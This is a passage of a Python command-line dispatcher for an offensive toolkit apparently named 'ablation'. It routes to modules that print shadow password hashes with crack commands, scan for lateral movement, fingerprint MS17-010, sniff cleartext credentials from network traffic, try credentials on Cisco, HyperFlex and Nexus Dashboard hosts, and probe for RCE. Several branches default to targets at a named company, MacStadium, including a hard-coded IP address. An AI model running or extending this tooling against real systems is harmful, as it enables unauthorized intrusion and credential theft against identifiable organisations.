            print(json.dumps({k: v for k, v in result.items() if k != 'tracing_scripts'},
                             indent=2, default=str))

    elif args.ise_iso or args.ise_mountpoint:
        ablation.banner()
        if not HAS_ISE_ISO:
            print("[-] ise_iso module not available")
        else:
            iso  = getattr(args, 'ise_iso', None)
            mnt  = getattr(args, 'ise_mountpoint', None)
            print(f"[*] ISE ISO analysis: {iso or mnt}")
            analyzer = ISEISOAnalyzer(iso_path=iso, mountpoint=mnt)
            try:
                result = analyzer.analyze()
            finally:
                analyzer.cleanup()
            # Print shadow hashes immediately
            for e in result.get('shadow', []):
                print(f"[HASH] {e['user']}: {e['hash']}")
                print(f"       crack: {e['hash_id']['cmd']}")
            print(json.dumps(result, indent=2, default=str))

    elif args.ise is not None:
        ablation.banner()
        if not HAS_ISE:
            print("[-] ise_enum module not available")
        else:
            targets = [{'host': args.ise, 'port': 443}] if args.ise else None
            print(f"[*] Cisco ISE 3.1 enumeration: {args.ise or 'MacStadium candidates'}...")
            result = ablation.enumerate_ise(targets=targets)
            print(json.dumps(result, indent=2, default=str))

    elif args.macos:
        ablation.banner()
        ablation.detect_platform()
        print("[*] macOS attack surface enumeration...")
        if HAS_MACOS_MALWARE:
            ablation.analyze_macos_malware()
            mm = ablation.findings['macos_malware']
            print(f"  Malware IOC findings: {mm.get('finding_count', 0)}")
        if HAS_MACOS_SYSADMIN:
            result = ablation.enumerate_macos_sysadmin()
            print(json.dumps(result, indent=2, default=str))
        else:
            print("[-] macos_sysadmin module not available")

    elif args.lateral:
        ablation.banner()
        if not HAS_LATERAL:
            print("[-] lateral_movement module not available")
        else:
            print("[*] Lateral movement scan...")
            scanner = LateralMovementScanner(scan_network=True, scan_timeout=0.5, max_workers=80)
            results = scanner.run_all()
            print(scanner.report())
            print(json.dumps(results, indent=2, default=str))

    elif getattr(args, 'winprobe', None):
        ablation.banner()
        if not HAS_LATERAL:
            print("[-] lateral_movement module not available")
        else:
            host = args.winprobe
            port = getattr(args, 'winprobe_port', 445)
            timeout = getattr(args, 'winprobe_timeout', 5.0)
            print(f"[*] Windows protocol surface probe: {host}:{port}")
            enum = LateralMovementEnumerator(host, port=port, timeout=timeout)
            result = enum.run()
            ablation.findings['lateral_movement'] = result
            sev = result.get('severity', 'INFO')
            print(f"  [{sev}] SMB null session: {result['smb_null_session'].get('null_session')}")
            print(f"  [{sev}] WMI/RPC reachable: {result['wmi_dcom'].get('reachable')}")
            print(f"  [{sev}] RPC endpoints:     {len(result.get('rpc_endpoints', []))}")
            print(f"  [{sev}] WinRM reachable:   {result['winrm'].get('reachable')} "
                  f"auth={result['winrm'].get('auth_methods')}")
            print(f"  [{sev}] RDP reachable:     {result['rdp'].get('reachable')} "
                  f"NLA={result['rdp'].get('nla_required')}")
            print(f"  [{sev}] MS17-010 fp:       {result['ms17_010'].get('vulnerable_fingerprint')} "
                  f"dialect={result['ms17_010'].get('smb_dialect')}")
            print(json.dumps(result, indent=2, default=str))

    elif args.tls is not None:
        ablation.banner()
        if not HAS_TLS:
            print("[-] tls_analyzer module not available")
        else:
            analyzer = TLSAnalyzer()
            if args.tls:
                targets = []
                for t in args.tls:
                    if ':' in t:
                        h, p = t.rsplit(':', 1)
                        targets.append({'host': h, 'port': int(p)})
                    else:
                        targets.append({'host': t, 'port': 443})
                results = analyzer.analyze_hosts(targets)
            else:
                print("[*] TLS audit: MacStadium VPN targets")
                results = analyzer.analyze_macstadium()
            print(analyzer.report(results))

    elif args.containers:
        ablation.banner()
        print("[*] Full container/platform analysis...\n")
        docker_enum = DockerEnumerator()
        docker_enum.enumerate_all()
        print(docker_enum.report())
        print()
        k8s_enum = K8sEnumerator()
        k8s_enum.enumerate_all()
        print(k8s_enum.report())
        print()
        orka_enum = OrkaEnumerator()
        orka_enum.enumerate_all()
        print(orka_enum.report())
    
    elif args.nginx is not None:
        ablation.banner()
        if not HAS_NGINX:
            print("[-] nginx_enum module not available")
        else:
            host = args.nginx or '207.254.14.1'
            print(f"[*] Nginx enumeration: {host} (NX-OS nginx 1.7.10 target)...")
            enumerator = NginxEnumerator(host)
            results = enumerator.run()
            ablation.findings['nginx'] = results
            for f in results.get('findings', []):
                print(f"  [{f.get('severity', 'INFO')}] {f.get('title', f.get('type', ''))}")
            print(json.dumps(results, indent=2, default=str))

    elif args.ios is not None:
        ablation.banner()
        if not HAS_IOS:
            print("[-] ios_enum module not available")
        else:
            if args.ios:
                targets = [{'host': args.ios, 'port': 443, 'label': 'cli-arg'}]
            else:
                targets = MACSTADIUM_IOS_CANDIDATES
            print(f"[*] Cisco IOS/IOS-XE enumeration: {args.ios or 'MacStadium candidates'}...")
            results = []
            for t in targets:
                enum = IOSEnumerator(t['host'], port=t.get('port', 443))
                r = enum.run()
                results.append(r)
                for f in r.get('findings', []):
                    print(f"  [{f['severity']}] {f['title']}")
            ablation.findings['ios'] = results
            print(json.dumps(results, indent=2, default=str))

    elif args.podman is not None:
        ablation.banner()
        if not HAS_PODMAN:
            print("[-] podman_enum module not available")
        else:
            exec_oracle = getattr(args, 'podman_exec_oracle', False)
            sock = args.podman or None
            if sock:
                print(f"[*] Podman enumeration via socket: {sock}")
            else:
                sockets = find_podman_sockets()
                print(f"[*] Podman auto-discovery: {len(sockets)} socket(s) found")
                for s in sockets:
                    print(f"    {s['path']} ({s['type']})")
            result = ablation.enumerate_podman_containers(
                socket_path=sock, exec_oracle=exec_oracle)
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'hyperflex', None):
        ablation.banner()
        if not HAS_HYPERFLEX:
            print("[-] hyperflex_enum module not available")
        else:
            print(f"[*] HyperFlex Connect enum: {args.hyperflex}")
            results = ablation.enumerate_hyperflex(hosts=args.hyperflex)
            for r in results:
                cred = r.get('cred_result')
                print(f"  {r['host']}: reachable={r['reachable']} "
                      f"creds={cred} "
                      f"intersight_code={r.get('intersight_claim_code')} "
                      f"iscsi={len(r.get('iscsi_targets', []))} "
                      f"nfs={len(r.get('nfs_exports', []))}")
            print(json.dumps(results, indent=2, default=str))

    elif getattr(args, 'streaming', None):
        ablation.banner()
        if not HAS_STREAMING:
            print("[-] streaming_enum module not available")
        else:
            print(f"[*] Streaming pipeline enum: {args.streaming}")
            results = ablation.enumerate_streaming(hosts=args.streaming)
            for host, svcs in results.items():
                kafka_topics = svcs.get('kafka', {}).get('topics', [])
                flink_jar = svcs.get('flink', {}).get('jar_upload_open', False)
                nifi_unauth = not svcs.get('nifi', {}).get('auth_required', True)
                print(f"  {host}: kafka_topics={len(kafka_topics)} "
                      f"flink_rce={flink_jar} nifi_unauth={nifi_unauth}")
            print(json.dumps(results, indent=2, default=str))

    elif getattr(args, 'nexus_dash', None):
        ablation.banner()
        if not HAS_NEXUS_DASH:
            print("[-] nexus_dashboard_enum module not available")
        else:
            print(f"[*] Nexus Dashboard SSO pivot: {args.nexus_dash}")
            results = ablation.enumerate_nexus_dashboard(hosts=args.nexus_dash)
            for r in results:
                cred = r.get('cred_result')
                impact = r.get('sso_impact', {})
                print(f"  {r['host']}: creds={cred} "
                      f"sites={impact.get('sites',0)} "
                      f"kafka_open={r.get('kafka_export_open')}")
            print(json.dumps(results, indent=2, default=str))

    elif getattr(args, 'cisco_api', None):
        ablation.banner()
        if not HAS_CISCO_API:
            print("[-] cisco_api_enum module not available")
        else:
            print(f"[*] Cisco platform API sweep: {args.cisco_api}")
            results = ablation.enumerate_cisco_apis(hosts=args.cisco_api)
            for host, svcs in results.items():
                for svc, data in svcs.items():
                    cred = data.get('cred_result')
                    if cred or data.get('reachable'):
                        print(f"  {host}/{svc}: reachable={data.get('reachable')} creds={cred}")
            print(json.dumps(results, indent=2, default=str))

    elif args.sniff is not None:
        ablation.banner()
        if not HAS_NET_SNIFFER:
            print("[-] net_sniffer module not available")
        else:
            duration = args.sniff
            print(f"[*] Raw packet capture for {duration}s (needs root / CAP_NET_RAW)...")
            result = sniff_network(duration=duration)
            ablation.findings['net_sniffer'] = result
            if result.get('error'):
                print(f"[-] {result['error']}")
            else:
                print(f"[+] Packets captured: {result['packets']}")
                print(f"[+] Unique connections: {len(result.get('connections', []))}")
                creds = result.get('credentials', [])
                if creds:
                    print(f"[!] Credentials extracted: {len(creds)}")
                    for c in creds:
                        print(f"    [{c['proto']}] {c['type']}: {c['value']} "
                              f"({c.get('src', '?')} -> {c.get('dst', '?')}:{c.get('port', '?')})")
                else:
                    print("[*] No cleartext credentials observed")
                arp = result.get('arp_table', [])
                if arp:
                    print(f"[*] ARP cache: {len(arp)} entries")
                    for e in arp:
                        flag = 'complete' if e.get('complete') else 'stale'
                        print(f"    {e['ip']:18s}  {e['mac']}  {e['interface']}  [{flag}]")
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'cisco_re', None):
        ablation.banner()
        host = args.cisco_re
        port = getattr(args, 'cisco_re_port', 443)
        print(f"[*] Cisco RE probe suite: {host}:{port}")
        print(f"    ASA={HAS_ASA_ENUM} IOS={HAS_IOS} NXOS={HAS_NXOS} ISE={HAS_ISE} API={HAS_CISCO_API}")
        result = ablation.enumerate_cisco_re(host, port=port)
        crit = result.get('critical', 0)
        high = result.get('high', 0)
        total = result.get('total_findings', 0)
        print(f"\n[+] Probes run:     {result.get('probes_run', 0)}")
        print(f"[+] Total findings: {total}")
        print(f"[!] CRITICAL: {crit}  HIGH: {high}")
        for f in result.get('findings', []):
            sev = f.get('severity', 'INFO')
            if sev in ('CRITICAL', 'HIGH', 'MEDIUM'):
                print(f"  [{sev}] {f.get('title', '')} — {f.get('detail', '')[:120]}")
        print(json.dumps(result, indent=2, default=str))

    else:
        ablation.run_autonomous()
        print("[+] Analysis complete!")
        print(f"[+] Full report: /tmp/ablation-report.json")
        print(f"[+] Summary: /tmp/ablation-summary.txt")

if __name__ == '__main__':
    import os
    main()
